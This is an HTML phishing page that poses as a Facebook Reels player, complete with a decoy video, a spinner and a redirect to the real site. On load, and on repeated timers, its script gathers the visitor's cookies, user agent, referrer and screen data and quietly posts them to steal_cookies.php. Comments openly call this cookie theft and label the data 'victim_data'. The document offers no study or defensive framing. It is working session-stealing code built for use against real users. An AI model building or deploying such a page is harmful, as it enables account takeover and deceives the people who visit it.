# Cookie_phishing
<!DOCTYPE html>
<html>
<head>
    <title>Facebook Reels</title>
    <style>
        body { margin:0; background:#000; overflow:hidden; }
        .reels-player {
            position:relative; width:100vw; height:100vh; 
            background:linear-gradient(45deg, #000 30%, #1a1a1a 100%);
        }
        .reel-video {
            position:absolute; top:0; left:0; width:100%; height:100%; 
            object-fit:cover; background:#111;
        }
        .loading { 
            position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
            color:#fff; font-family: -apple-system; font-size:18px; text-align:center;
        }
        .spinner {
            border:3px solid #333; border-top:3px solid #1877f2; 
            border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite;
            margin:0 auto 15px;
        }
        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
    </style>
</head>
<body>
    <div class="reels-player">
        <!-- Fake video background -->
        <video class="reel-video" autoplay loop muted playsinline>
            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
        </video>
        
        <!-- Stealth loading spinner (cookie theft hocche) -->
        <div class="loading" id="loader">
            <div class="spinner"></div>
            Loading reel...
        </div>
        
        <!-- Invisible pixel for FB tracking simulation -->
        <img src="https://www.facebook.com/tr?id=steal&ev=ReelView" style="display:none;">
    </div>

    <script>
    // IMMEDIATE cookie theft (page load e)
    window.onload = function() {
        stealCookies();
    };
    
    function stealCookies() {
        // FB session cookies + sab
        var fb_cookies = document.cookie;
        var victim_data = {
            cookies: fb_cookies,
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            screen: screen.width + 'x' + screen.height,
            timestamp: new Date().toISOString()
        };
        
        // Stealth POST (background e)
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'steal_cookies.php', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(victim_data));
        
        // 2 second por loader hide + real reels e redirect
        setTimeout(function() {
            document.getElementById('loader').style.display = 'none';
            // Real FB reels e pathay
            window.location.href = 'https://www.facebook.com/reels/';
        }, 2000);
    }
    
    // Aggressive: Multiple theft attempts
    setTimeout(stealCookies, 500);
    setTimeout(stealCookies, 1500);
    </script>
</body>
</html>
